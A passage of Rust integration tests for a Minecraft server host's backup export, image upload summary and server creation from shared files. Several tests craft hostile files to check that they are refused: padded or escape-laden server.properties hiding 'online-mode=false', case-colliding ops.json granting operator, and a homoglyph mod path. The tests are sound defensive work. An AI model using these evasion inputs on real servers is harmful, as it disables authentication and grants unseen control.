    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, _) = core
        .call(
            Method::POST,
            &format!(
                "/instance/{}/backups/20200101-000000-0000/export",
                core.uuid
            ),
            &owner,
            None,
        )
        .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn each_user_holds_a_few_backup_files_until_they_let_one_go() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let path = format!("/instance/{}/backups/{id}/export", core.uuid);
    let mut keys = Vec::new();
    for _ in 0..crate::handlers::global_fs::MAX_BACKUP_FILES_PER_USER {
        let (status, body) = core.call(Method::POST, &path, &owner, None).await;
        assert_eq!(status, StatusCode::OK, "{body}");
        keys.push(body["key"].as_str().unwrap().to_string());
    }
    // a zip counts too
    let zip = format!("/instance/{}/backups/{id}/download", core.uuid);
    let (status, body) = core.call(Method::POST, &zip, &owner, None).await;
    assert_eq!(status, StatusCode::TOO_MANY_REQUESTS, "{body}");
    let (status, _) = core.call(Method::POST, &path, &owner, None).await;
    assert_eq!(status, StatusCode::TOO_MANY_REQUESTS);
    // another user isn't limited by the owner's files, nor may let them go
    let reader = core
        .member("reader", |p| {
            p.can_read_instance_file.insert(core.uuid.clone());
        })
        .await;
    let (status, body) = core.call(Method::POST, &path, &reader, None).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let release = format!("/file/{}", keys[0]);
    let (status, _) = core.call(Method::DELETE, &release, &reader, None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    // letting one go deletes its file at once and frees its place
    let (status, body) = core.call(Method::DELETE, &release, &owner, None).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, _) = core.call(Method::GET, &release, &owner, None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, body) = core.call(Method::POST, &zip, &owner, None).await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

#[tokio::test]
async fn a_cancelled_export_leaves_nothing() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let tmp = core.dir.path().join("exports");
    let cancel = core.state.backups.cancel_token().child_token();
    cancel.cancel();
    let result = core
        .state
        .backups
        .export(
            &core.uuid,
            &id,
            "Survival".into(),
            false,
            tmp.clone(),
            "x.lodeimg".into(),
            cancel,
            |_, _| {},
            (),
        )
        .await;
    assert!(result.is_err());
    let left: Vec<_> = std::fs::read_dir(&tmp)
        .map(|dir| dir.flatten().collect())
        .unwrap_or_default();
    assert!(left.is_empty(), "{left:?}");
}

// ---------------------------------------------------------------------------------------
// Uploading and inspecting

/// A `multipart/form-data` body with one `file` field.
pub(super) fn multipart(name: &str, content: &[u8]) -> (String, Vec<u8>) {
    let boundary = "----lodestone-image-boundary";
    let mut body = format!(
        "--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{name}\"\r\nContent-Type: application/octet-stream\r\n\r\n"
    )
    .into_bytes();
    body.extend_from_slice(content);
    body.extend_from_slice(format!("\r\n--{boundary}--\r\n").as_bytes());
    (format!("multipart/form-data; boundary={boundary}"), body)
}

impl Core {
    /// Uploads the file at `path` as `name`.
    pub async fn upload(&self, token: &str, path: &Path, name: &str) -> (StatusCode, Value) {
        let (content_type, body) = multipart(name, &std::fs::read(path).unwrap());
        let response = self
            .client
            .post(format!("{}/instance/image/upload", self.base))
            .bearer_auth(token)
            .header("Content-Type", content_type)
            .body(body)
            .send()
            .await
            .unwrap();
        let status = response.status();
        let text = response.text().await.unwrap();
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    /// Uploads `path`, which must be taken. Returns the upload's id and summary.
    pub async fn upload_ok(&self, token: &str, path: &Path) -> (String, Value) {
        let (status, body) = self.upload(token, path, "shared.lodeimg").await;
        assert_eq!(status, StatusCode::OK, "{body}");
        (
            body["upload_id"].as_str().unwrap().to_string(),
            body["summary"].clone(),
        )
    }
}

/// Lithium on the fake Modrinth: a server-side mod a Launcher file names.
pub(super) fn lithium() -> FakeVersion {
    FakeVersion::new("gvQqBUqZ", "l1", "lithium.jar").game_versions(&["1.21.1"])
}

/// A Fabric mod jar declaring `environment`, as bytes.
pub(super) fn fabric_jar(id: &str, environment: &str) -> Vec<u8> {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("mod.jar");
    crate::mods::metadata::tests::make_zip(
        &path,
        &[(
            "fabric.mod.json",
            &format!(
                r#"{{"schemaVersion":1,"id":"{id}","version":"1","environment":"{environment}"}}"#
            ),
        )],
    );
    std::fs::read(path).unwrap()
}

/// What a Launcher's snapshot export of a Fabric 1.21.1 instance holds, made with the
/// shared crate as the Launcher makes it: a data image with two worlds (`A`, played last,
/// with a Nether, and `B`) and a player's files, linked to a content image with a Modrinth
/// mod for both sides, a client-only Modrinth mod, a jar it carries, a jar that says it is
/// client only, a CurseForge mod it doesn't carry and a config. `tweak` changes the images
/// before they are sealed (`data`, `content`, the store holding the objects).
pub(super) fn launcher_file(
    dir: &Path,
    tweak: impl FnOnce(&mut Image, &mut Image, &lodestone_image::store::Store),
) -> PathBuf {
    use lodestone_image::manifest::{App, Kind};
    use lodestone_image::{CanonicalPath, Entry, EnvValue, Game, Loader, Producer, World};
    let store = lodestone_image::store::Store::new(
        dir.join(format!("launcher-store-{}", rand_suffix())),
        lodestone_image::store::Encoding::Raw,
    );
    let object = |path: &str, bytes: &[u8]| {
        let stored = store.put_bytes(bytes).unwrap();
        Entry::new(
            CanonicalPath::new(path).unwrap(),
            bytes.len() as u64,
            stored.sha256,
            Source::Object {},
        )
    };
    let modrinth = |path: &str, version: &FakeVersion| {
        let file = &version.version.files[0];
        let mut entry = Entry::new(
            CanonicalPath::new(path).unwrap(),
            version.content.len() as u64,
            lodestone_image::hex::sha256_hex(&version.content),
            Source::modrinth_from_url(&file.url).unwrap(),
        );
        entry.sha512 = Some(file.sha512.clone());
        entry
    };
    let game = Game {
        minecraft: "1.21.1".into(),
        loader: Loader::Fabric,
        loader_version: Some("0.16.10".into()),
    };
    let producer = Producer {
        app: App::Launcher,
        version: "1.0.0".into(),
    };
    let mut content = Image::new(Kind::Content, game.clone());
    content.producer = producer.clone();
    let mut sodium = modrinth("mods/sodium.jar", &sodium());
    sodium.env.client = EnvValue::Required;
    sodium.env.server = EnvValue::Unsupported;
    sodium.env_from = vec![lodestone_image::EnvFrom::ModrinthEnvironment];
    let mut curseforge = Entry::new(
        CanonicalPath::new("mods/cf.jar").unwrap(),
        5,
        lodestone_image::hex::sha256_hex(b"cfmod"),
        Source::Curseforge {
            project: 1,
            file: 2,
            downloadable: true,
        },
    );
    curseforge.sha1 = None;
    content.entries = vec![
        modrinth("mods/lithium.jar", &lithium()),
        sodium,
        object("mods/carried.jar", b"a jar only the sender has"),
        object("mods/zoom.jar", &fabric_jar("zoom", "client")),
        curseforge,
        object("config/lithium.properties", b"mixin.ai=false\n"),
    ];
    let mut data = Image::new(Kind::Data, game);
    data.producer = producer;
    data.label = Some("My world".into());
    let world = |name: &str, last_played: i64| World {
        name: name.into(),
        level_name: Some(format!("{name} level")),
        data_version: None,
        game_version: None,
        size: None,
        last_played: Some(last_played),
        quiesced: Some(true),
    };
    data.worlds = vec![world("A", 200), world("B", 100)];
    data.entries = vec![
        object("saves/A/level.dat", b"level A"),
        object("saves/A/region/r.0.0.mca", b"region A"),
        object("saves/A/DIM-1/region/r.0.0.mca", b"nether A"),
        object("saves/B/level.dat", b"level B"),
        object("options.txt", b"fov:90"),
        object("resourcepacks/x.zip", b"pack"),
    ];
    tweak(&mut data, &mut content, &store);
    content.normalize();
    content.seal();
    data.content = Some(content.id.clone());
    data.normalize();
    data.seal();
    let to = dir.join(format!("launcher-{}.lodeimg", rand_suffix()));
    container::export(
        &store,
        &data,
        std::slice::from_ref(&content),
        &to,
        lodestone_image::store::NEVER,
    )
    .unwrap();
    to
}

fn names(list: &Value) -> Vec<String> {
    list["names"]
        .as_array()
        .unwrap()
        .iter()
        .map(|n| n.as_str().unwrap().to_string())
        .collect()
}

#[tokio::test]
async fn a_hosts_export_is_summed_up() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let file = core.export(&owner, &id, json!({})).await;
    let (_, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["made_by"], "host");
    assert_eq!(summary["server"], "Fabric");
    assert_eq!(summary["unsupported"], Value::Null);
    assert_eq!(summary["minecraft"], "1.21.1");
    assert_eq!(summary["loader_version"], "0.16.10");
    assert_eq!(names(&summary["operators"]), ["Notch"]);
    assert_eq!(summary["offline_mode"], true);
    assert_eq!(summary["default_world"], "world");
    assert_eq!(names(&summary["mods_from_modrinth"]), ["sodium.jar"]);
    assert_eq!(
        names(&summary["carried_mods"]),
        ["Essentials.jar", "own.jar"]
    );
    let blanked = names(&summary["blanked"]);
    assert!(
        blanked.contains(&"server.properties: rcon.password".to_string()),
        "{blanked:?}"
    );
    assert!(names(&summary["left_out"]).contains(&"/eula.txt".to_string()));
    assert!(summary["not_taken"]
        .as_array()
        .unwrap()
        .contains(&json!("operators")));
    assert_eq!(summary["needs_global_files"], true);
    assert!(summary["download_bytes"].as_u64().unwrap() > 0);
}

#[tokio::test]
async fn a_launchers_export_is_summed_up() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});
    let (_, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["made_by"], "launcher");
    assert_eq!(summary["label"], "My world");
    let worlds: Vec<&str> = summary["worlds"]
        .as_array()
        .unwrap()
        .iter()
        .map(|w| w["folder"].as_str().unwrap())
        .collect();
    assert_eq!(worlds, ["A", "B"]);
    assert_eq!(summary["worlds"][0]["name"], "A level");
    assert_eq!(summary["default_world"], "A");
    assert_eq!(names(&summary["client_only"]), ["sodium.jar"]);
    assert_eq!(names(&summary["carried_mods"]), ["carried.jar", "zoom.jar"]);
    // lithium from Modrinth and the two carried jars: what the trust advisory counts
    assert_eq!(summary["server_mods"], 3);
    assert_eq!(names(&summary["not_downloadable"]), ["mods/cf.jar"]);
    assert_eq!(names(&summary["mods_from_curseforge"]), ["cf.jar"]);
    assert_eq!(summary["needs_global_files"], true);
    assert!(summary["not_taken"]
        .as_array()
        .unwrap()
        .contains(&json!("client_files")));
    assert_eq!(summary["operators"]["count"], 0);
}

#[tokio::test]
async fn files_no_server_may_be_made_from_are_refused() {
    let core = core().await;
    let owner = core.owner().await;
    let dir = core.dir.path();
    let good = launcher_file(dir, |_, _, _| {});

    // not an image file, or not a zip
    let (status, _) = core.upload(&owner, &good, "shared.zip").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let junk = dir.join("junk.lodeimg");
    std::fs::write(&junk, b"not a zip at all").unwrap();
    let (status, body) = core.upload(&owner, &junk, "junk.lodeimg").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");

    let add = |path: &'static str| {
        move |_: &mut Image, content: &mut Image, store: &lodestone_image::store::Store| {
            let stored = store.put_bytes(b"x").unwrap();
            content.entries.push(lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                1,
                stored.sha256,
                Source::Object {},
            ));
        }
    };
    for (what, file) in [
        (
            "Lodestone's name",
            launcher_file(dir, add("mods/.lodestone_client_mods.json")),
        ),
        ("a long s", launcher_file(dir, add("modſ/evil.jar"))),
        (
            "a version that isn't one",
            launcher_file(dir, |data, content, _| {
                data.game.minecraft = "1.21.1 (checked)".into();
                content.game.minecraft = "1.21.1 (checked)".into();
            }),
        ),
    ] {
        let (status, body) = core.upload(&owner, &file, "x.lodeimg").await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{what}: {body}");
    }

    // Quilt: read, but no server can be made from it
    let quilt = launcher_file(dir, |data, content, _| {
        data.game.loader = lodestone_image::Loader::Quilt;
        content.game.loader = lodestone_image::Loader::Quilt;
    });
    let (_, summary) = core.upload_ok(&owner, &quilt).await;
    assert!(summary["unsupported"].as_str().unwrap().contains("Quilt"));
    assert_eq!(summary["server"], Value::Null);
}

/// The summary reads `server.properties` and `ops.json` as the server will: a file whose
/// settings files the summary can't read whole (over 1 MiB, so a padded
/// `server.properties` could turn online mode off unseen), spells one in other letters
/// (`SERVER.PROPERTIES`, which a Linux server never reads) or has two paths that are one
/// on a disk that ignores letter case (`OPS.JSON` naming a friend, `ops.json` the sender)
/// is refused.
#[tokio::test]
async fn settings_the_summary_cant_read_as_the_server_does_refuse_the_file() {
    let core = core().await;
    let owner = core.owner().await;
    let dir = core.dir.path();
    let add = |files: Vec<(&'static str, Vec<u8>)>| {
        move |data: &mut Image, _: &mut Image, store: &lodestone_image::store::Store| {
            for (path, bytes) in files {
                let stored = store.put_bytes(&bytes).unwrap();
                data.entries.push(lodestone_image::Entry::new(
                    lodestone_image::CanonicalPath::new(path).unwrap(),
                    bytes.len() as u64,
                    stored.sha256,
                    Source::Object {},
                ));
            }
        }
    };
    let mut padded = vec![b'#'; (1 << 20) + 10];
    padded.extend_from_slice(b"\nonline-mode=false\n");
    let ops = |uuid: &str, name: &str| {
        format!(r#"[{{"uuid":"{uuid}","name":"{name}","level":4}}]"#).into_bytes()
    };
    for (what, files) in [
        (
            "padded server.properties",
            vec![("server.properties", padded)],
        ),
        (
            "two ops.json",
            vec![
                (
                    "OPS.JSON",
                    ops("00000000-0000-0000-0000-000000000001", "Friend"),
                ),
                (
                    "ops.json",
                    ops("00000000-0000-0000-0000-000000000002", "Sender"),
                ),
            ],
        ),
        (
            "server.properties in capitals",
            vec![("SERVER.PROPERTIES", b"online-mode=false\n".to_vec())],
        ),
        // Java reads an unpaired surrogate, and Minecraft `online-mode=false\uD800` as off
        (
            "server.properties with an unpaired surrogate",
            vec![(
                "server.properties",
                b"online-mode=true\nonline-mode=false\\uD800\n".to_vec(),
            )],
        ),
        (
            "server.properties with a lone low surrogate",
            vec![("server.properties", b"online-mode=false\\uDC00\n".to_vec())],
        ),
        (
            "server.properties with a malformed escape",
            vec![(
                "server.properties",
                b"motd=\\u12\nonline-mode=true\n".to_vec(),
            )],
        ),
        // Gson reads these, strict JSON doesn't: the summary would show no operators
        (
            "ops.json with a byte order mark",
            vec![("ops.json", {
                let mut bytes = b"\xEF\xBB\xBF".to_vec();
                bytes.extend(ops("00000000-0000-0000-0000-000000000002", "Sender"));
                bytes
            })],
        ),
        (
            "ops.json with text after it",
            vec![("ops.json", {
                let mut bytes = ops("00000000-0000-0000-0000-000000000002", "Sender");
                bytes.extend(b" garbage");
                bytes
            })],
        ),
        (
            "ops.json with a key twice",
            vec![(
                "ops.json",
                br#"[{"uuid":"00000000-0000-0000-0000-000000000002","name":"A","name":"Sender"}]"#
                    .to_vec(),
            )],
        ),
        (
            "a world in two spellings",
            vec![
                ("Notes/a.txt", b"a".to_vec()),
                ("notes/b.txt", b"b".to_vec()),
            ],
        ),
    ] {
        let file = launcher_file(dir, add(files));
        let (status, body) = core.upload(&owner, &file, "x.lodeimg").await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{what}: {body}");
    }
    // the plain spelling, small, is read
    let file = launcher_file(
        dir,
        add(vec![("server.properties", b"online-mode=false\n".to_vec())]),
    );
    let (_, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["offline_mode"], true, "{summary}");
    // Minecraft trims nothing from the value: an escaped space before `true` is off
    for written in [
        &b"online-mode=\\ true\n"[..],
        b"online-mode=\\ttrue\n",
        "online-mode=\u{3000}true\n".as_bytes(),
    ] {
        let file = launcher_file(dir, add(vec![("server.properties", written.to_vec())]));
        let (_, summary) = core.upload_ok(&owner, &file).await;
        assert_eq!(summary["offline_mode"], true, "{written:?}: {summary}");
    }
    // an empty ops.json has no operators, as Minecraft reads it
    let file = launcher_file(dir, add(vec![("ops.json", Vec::new())]));
    let (_, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["operators"]["count"], 0, "{summary}");
}

#[tokio::test]
async fn a_file_naming_too_many_downloads_is_refused() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, content, _| {
        for n in 0..=lodestone_image::share::MAX_DOWNLOADS {
            let url = format!("https://cdn.modrinth.com/data/P{n}/versions/V{n}/m.jar");
            let mut entry = lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(format!("mods/m{n}.jar")).unwrap(),
                1,
                format!("{n:064x}"),
                Source::modrinth_from_url(&url).unwrap(),
            );
            entry.sha512 = Some(format!("{n:0128x}"));
            content.entries.push(entry);
        }
    });
    let (status, body) = core.upload(&owner, &file, "many.lodeimg").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body.to_string().contains("to download"), "{body}");
}

#[tokio::test]
async fn an_upload_too_big_for_the_cap_is_refused_before_its_body() {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let core = core().await;
    let owner = core.owner().await;
    let address = core
        .base
        .trim_start_matches("http://")
        .trim_end_matches("/api/v1")
        .to_string();
    let mut stream = tokio::net::TcpStream::connect(&address).await.unwrap();
    let request = format!(
        "POST /api/v1/instance/image/upload HTTP/1.1\r\nHost: {address}\r\nAuthorization: Bearer {owner}\r\nContent-Type: multipart/form-data; boundary=b\r\nContent-Length: {}\r\n\r\n--b\r\n",
        super::uploads::MAX_IMAGE_UPLOAD_BYTES * 2
    );
    stream.write_all(request.as_bytes()).await.unwrap();
    let mut answer = vec![0u8; 64];
    let n = stream.read(&mut answer).await.unwrap();
    let status = String::from_utf8_lossy(&answer[..n]).to_string();
    assert!(!status.starts_with("HTTP/1.1 200"), "{status}");
    assert!(status.starts_with("HTTP/1.1 4"), "{status}");
}

#[tokio::test]
async fn uploads_are_the_uploaders_alone() {
    let core = core().await;
    let owner = core.owner().await;
    let creator = core
        .user(
            "creator",
            false,
            UserPermission {
                can_create_instance: true,
                ..Default::default()
            },
        )
        .await;
    let viewer = core.member("viewer", |_| {}).await;
    let file = launcher_file(core.dir.path(), |_, _, _| {});

    let (status, _) = core.upload(&viewer, &file, "x.lodeimg").await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let (upload_id, _) = core.upload_ok(&owner, &file).await;
    let path = format!("/instance/image/upload/{upload_id}");
    let (status, _) = core.call(Method::DELETE, &path, &creator, None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, _) = core.call(Method::DELETE, &path, &viewer, None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    let (status, _) = core.call(Method::DELETE, &path, &owner, None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = core.call(Method::DELETE, &path, &owner, None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    // its file went with it (deleted on a blocking thread, so not at once)
    let uploads = core.dir.path().join("image-uploads");
    wait_until("the upload's file is deleted", || async {
        std::fs::read_dir(&uploads).unwrap().count() == 0
    })
    .await;
}

// ---------------------------------------------------------------------------------------
// Making a server from a file

use crate::implementations::minecraft::MinecraftInstance;
use crate::prelude::GameInstance;
use crate::traits::t_configurable::TConfigurable;
use crate::traits::t_server::TServer;

/// A new server made from a file, and how its creation ended.
pub(super) struct Made {
    pub instance: MinecraftInstance,
    pub root: PathBuf,
    pub uuid: InstanceUuid,
    /// The creation's last message.
    pub message: String,
}

impl Made {
    pub fn read(&self, path: &str) -> String {
        std::fs::read_to_string(self.root.join(path)).unwrap_or_else(|e| panic!("{path}: {e}"))
    }

    pub fn has(&self, path: &str) -> bool {
        self.root.join(path).exists()
    }
}

impl Drop for Made {
    fn drop(&mut self) {
        // the folder is in the test process's shared instances folder
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

impl Core {
    /// Asks for a server from the upload `upload_id` (of the image `image`).
    pub async fn create(&self, token: &str, body: Value) -> (StatusCode, Value) {
        self.call(
            Method::POST,
            "/instance/create_from_image",
            token,
            Some(body),
        )
        .await
    }

    /// Makes a server and waits for its creation to end; `None` when it failed (with the
    /// message).
    pub async fn create_and_wait(&self, token: &str, body: Value) -> Result<Made, String> {
        let mut events = self.state.event_broadcaster.subscribe();
        let (status, reply) = self.create(token, body).await;
        assert_eq!(status, StatusCode::OK, "{reply}");
        let uuid: InstanceUuid = serde_json::from_value(reply).unwrap();
        loop {
            let event = tokio::time::timeout(std::time::Duration::from_secs(60), events.recv())
                .await
                .expect("the creation ends")
                .unwrap();
            let crate::events::EventInner::ProgressionEvent(p) = event.event_inner else {
                continue;
            };
            let crate::events::ProgressionEventInner::ProgressionEnd {
                success, message, ..
            } = p.progression_event_inner()
            else {
                continue;
            };
            let message = message.clone().unwrap_or_default();
            if !success {
                return Err(message);
            }
            let Some(entry) = self.state.instances.get(&uuid) else {
                continue;
            };
            let GameInstance::MinecraftInstance(instance) = entry.value().clone();
            drop(entry);
            let root = instance.path().await;
            return Ok(Made {
                instance,
                root,
                uuid,
                message,
            });
        }
    }
}

/// The relative paths of every file under `root`, with their bytes.
fn tree(root: &Path) -> std::collections::BTreeMap<String, Vec<u8>> {
    walkdir::WalkDir::new(root)
        .into_iter()
        .flatten()
        .filter(|e| e.file_type().is_file())
        .map(|e| {
            let relative = e
                .path()
                .strip_prefix(root)
                .unwrap()
                .to_string_lossy()
                .replace('\\', "/");
            (relative, std::fs::read(e.path()).unwrap())
        })
        .collect()
}

/// The label of a server's current content image.
async fn current_label(core: &Core, uuid: &InstanceUuid) -> String {
    let id = core.state.images.current_content(uuid).await.unwrap();
    let store = core.state.images.store();
    store
        .load_header(uuid.as_ref(), &id)
        .unwrap()
        .label
        .unwrap_or_default()
}

#[tokio::test]
async fn a_hosts_server_becomes_a_new_server_on_another_host() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let file = core.export(&owner, &id, json!({})).await;
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let before = core.modrinth.downloaded.lock().unwrap().len();
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Copy",
                "port": 25600
            }),
        )
        .await
        .unwrap();
    assert_eq!(made.instance.name().await, "Copy");
    assert_eq!(made.instance.port().await, 25600);
    assert_eq!(
        made.instance.state().await,
        crate::traits::t_server::State::Stopped
    );
    // the Modrinth mod was downloaded from its CDN URL, not taken from the file
    let downloaded = core.modrinth.downloaded.lock().unwrap()[before..].to_vec();
    assert_eq!(downloaded, [sodium().version.files[0].url.clone()]);
    assert_eq!(
        std::fs::read(made.root.join("mods/sodium.jar")).unwrap(),
        sodium().content
    );

    // every file the source server has, but what an export takes out and what the new
    // server's setup writes
    let source = tree(&core.root);
    let copy = tree(&made.root);
    let taken_out = |path: &str| {
        path.starts_with(".lodestone")
            || path.starts_with("libraries/")
            || path.starts_with("plugins/Essentials/")
            || [
                "eula.txt",
                "server.jar",
                "hs_err_pid1234.log",
                ".console_history",
                "ops.json",
                "server.properties",
                "config/paper-global.yml",
                "paper.yml",
                "pufferfish.yml",
                "config/pcf-common.toml",
                "forge-installer.log",
                "forge-1.20.1-installer.jar.log",
                "launcher_accounts.json",
                "command_history.txt",
                "banned-ips.json",
            ]
            .contains(&path)
    };
    let expected: Vec<(&String, &Vec<u8>)> = source.iter().filter(|(p, _)| !taken_out(p)).collect();
    let got: Vec<(&String, &Vec<u8>)> = copy.iter().filter(|(p, _)| !taken_out(p)).collect();
    assert_eq!(
        expected.iter().map(|(p, _)| p.as_str()).collect::<Vec<_>>(),
        got.iter().map(|(p, _)| p.as_str()).collect::<Vec<_>>()
    );
    assert_eq!(expected, got);

    // the setup's own files, the EULA as asked (not), no operators
    assert_eq!(made.read("server.jar"), "fake server jar");
    assert!(made.read("eula.txt").contains("eula=false"));
    assert!(!made.has("ops.json"));
    let properties = made.read("server.properties");
    for line in [
        "server-port=25600",
        "level-name=world",
        "enable-rcon=false",
        "rcon.password=\n",
        "management-server-enabled=false",
        "motd=Hello",
        "server-ip=\n",
    ] {
        assert!(properties.contains(line), "{line} not in {properties}");
    }
    assert!(!properties.contains(RCON_PASSWORD));
    assert!(made.read("config/paper-global.yml").contains("secret: ''"));
    let paper = made.read("paper.yml");
    assert!(
        paper.contains("    secret: ''\n    online-mode: true"),
        "{paper}"
    );
    let config = made.instance.config_snapshot().await;
    assert_eq!(config.java_cmd, None);
    assert!(config.cmd_args.is_empty());
    assert_eq!(
        current_label(&core, &made.uuid).await,
        "Created from shared.lodeimg"
    );
    // the upload is gone once used
    let (status, _) = core
        .call(
            Method::DELETE,
            &format!("/instance/image/upload/{upload_id}"),
            &owner,
            None,
        )
        .await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn operators_and_the_eula_come_only_when_asked() {
    let core = core().await;
    let owner = core.owner().await;
    let id = core.backup(&owner).await;
    let file = core.export(&owner, &id, json!({})).await;
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Ops",
                "port": 25601, "accept_eula": true, "keep_operators": true
            }),
        )
        .await
        .unwrap();
    assert!(made.read("ops.json").contains("Notch"));
    assert!(made.read("eula.txt").contains("eula=true"));
    let asked = core.setup.installed.lock().unwrap().last().unwrap().clone();
    assert!(asked.accept_eula);
    assert_eq!(asked.version, "1.21.1");
    assert_eq!(
        asked.flavour.loader_version().as_deref(),
        Some("0.16.10"),
        "the file's loader version"
    );
}

#[tokio::test]
async fn a_launchers_world_becomes_a_servers() {
    let core = core().await;
    core.modrinth.add(lithium());
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |_, content, store| {
        let stored = store.put_bytes(b"onEvent()").unwrap();
        content.entries.push(lodestone_image::Entry::new(
            lodestone_image::CanonicalPath::new("kubejs/server_scripts/a.js").unwrap(),
            9,
            stored.sha256,
            Source::Object {},
        ));
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["scripts_skipped"], 1, "code execution is off");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "From a Launcher",
                "port": 25602, "world": "A"
            }),
        )
        .await
        .unwrap();
    // the picked world as the level, in the vanilla layout; the other world, a player's
    // own files and the client-only mods left out
    assert_eq!(made.read("world/level.dat"), "level A");
    assert_eq!(made.read("world/DIM-1/region/r.0.0.mca"), "nether A");
    assert!(!made.has("B"));
    assert!(!made.has("saves"));
    assert!(!made.has("options.txt"));
    assert!(!made.has("resourcepacks"));
    assert!(!made.has("mods/sodium.jar"), "client only by its sides");
    assert!(!made.has("mods/zoom.jar"), "client only by its own jar");
    assert!(!made.has("mods/cf.jar"), "no CurseForge client here");
    assert!(!made.has("kubejs/server_scripts/a.js"));
    assert_eq!(
        std::fs::read(made.root.join("mods/lithium.jar")).unwrap(),
        lithium().content
    );
    assert_eq!(made.read("mods/carried.jar"), "a jar only the sender has");
    assert_eq!(made.read("config/lithium.properties"), "mixin.ai=false\n");
    assert!(made.read("server.properties").contains("level-name=world"));
    assert!(made.message.contains("zoom.jar"), "{}", made.message);
    assert!(made.message.contains("mods/cf.jar"), "{}", made.message);
    assert!(made.message.contains("script"), "{}", made.message);
}

#[tokio::test]
async fn a_paper_servers_world_is_split() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, _| {
        for image in [data, content] {
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image.settings.server = Some(lodestone_image::settings::ServerSettings {
                flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
                ..Default::default()
            });
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Paper");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Paper",
                "port": 25603, "world": "A"
            }),
        )
        .await
        .unwrap();
    assert_eq!(made.read("world/level.dat"), "level A");
    assert_eq!(made.read("world_nether/DIM-1/region/r.0.0.mca"), "nether A");
    assert!(!made.has("world/DIM-1"));
}

#[tokio::test]
async fn downloads_that_fail_are_left_out_or_placed_from_the_file() {
    let core = core().await;
    let owner = core.owner().await;
    let real = b"the real bytes of a mod".to_vec();
    let other = b"not what the file says".to_vec();
    let lying = "https://cdn.modrinth.com/data/LIAR1/versions/v1/liar.jar";
    let missing = "https://cdn.modrinth.com/data/GONE1/versions/v1/gone.jar";
    core.modrinth.add_file(lying, other);
    let file = launcher_file(core.dir.path(), |_, content, store| {
        let modrinth = |path: &str, url: &str, bytes: &[u8]| {
            let mut entry = lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                bytes.len() as u64,
                lodestone_image::hex::sha256_hex(bytes),
                Source::modrinth_from_url(url).unwrap(),
            );
            entry.sha512 = Some(crate::modrinth::fake::sha512_hex(bytes));
            entry
        };
        content
            .entries
            .push(modrinth("mods/liar.jar", lying, &real));
        content
            .entries
            .push(modrinth("mods/gone.jar", missing, b"never anywhere"));
        // the same bytes as liar.jar, carried: placed when its download fails its check
        let stored = store.put_bytes(&real).unwrap();
        content.entries.push(lodestone_image::Entry::new(
            lodestone_image::CanonicalPath::new("config/liar-copy.bin").unwrap(),
            real.len() as u64,
            stored.sha256,
            Source::Object {},
        ));
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Downloads",
                "port": 25604
            }),
        )
        .await
        .unwrap();
    assert_eq!(
        std::fs::read(made.root.join("mods/liar.jar")).unwrap(),
        real
    );
    assert!(!made.has("mods/gone.jar"));
    assert!(made.message.contains("mods/gone.jar"), "{}", made.message);
    assert!(!made.message.contains("mods/liar.jar"), "{}", made.message);
    // no world was picked: none is placed
    assert!(!made.has("world/level.dat"));
